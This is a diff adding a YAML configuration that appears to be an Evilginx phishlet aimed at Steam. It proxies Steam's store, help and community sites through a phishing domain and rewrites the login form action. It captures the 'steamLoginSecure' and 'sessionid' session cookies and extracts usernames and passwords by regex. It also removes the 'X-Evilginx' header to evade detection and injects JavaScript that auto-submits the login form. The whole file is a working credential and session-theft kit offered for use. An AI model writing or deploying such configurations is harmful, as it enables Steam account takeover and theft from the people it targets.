@@ -1,0 +1,49 @@
+name: "steam"
+author: "ваше_имя"
+min_ver: "3.3.0"
+
+proxy_hosts:
+  - {phish_sub: "store", orig_sub: "store", domain: "steampowered.com", session: true, is_landing: true}
+  - {phish_sub: "help", orig_sub: "help", domain: "steampowered.com", session: true}
+  - {phish_sub: "community", orig_sub: "steamcommunity", domain: "com", session: true}
+
+sub_filters:
+  "store.steampowered.com":
+    - {triggers_on: "form", orig_sub: "store", domain: "steampowered.com", search: 'action="https://store.steampowered.com/login/"', replace: 'action="https://store.yourphishdomain.com/login/"'}
+    - {triggers_on: "form", orig_sub: "store", domain: "steampowered.com", search: 'id="input_username"', replace: 'id="phish_username"'}
+    - {triggers_on: "form", orig_sub: "store", domain: "steampowered.com", search: 'id="input_password"', replace: 'id="phish_password"'}
+
+auth_tokens:
+  - domain: "steampowered.com"
+    keys: ["steamLoginSecure", "sessionid"]
+  - domain: "steamcommunity.com"
+    keys: ["steamLoginSecure", "sessionid"]
+
+auth_urls:
+  - "https://store.steampowered.com/login/"
+  - "https://steamcommunity.com/login/"
+
+credentials:
+  username:
+    key: "username"
+    search: '(?<=<input[^>]*name="username"[^>]*value=")([^"]+)'
+  password:
+    key: "password"
+    search: '(?<=<input[^>]*name="password"[^>]*value=")([^"]+)'
+
+login:
+  domain: "steampowered.com"
+  path: "/login/"
+
+response_headers:
+  remove:
+    - "X-Evilginx"
+
+js_inject:
+  - trigger_domains: ["store.steampowered.com"]
+    script: |
+      document.getElementById('login_btn_signin').addEventListener('click', function() {
+        setTimeout(function() {
+          document.forms[0].submit();
+        }, 100);
+      });
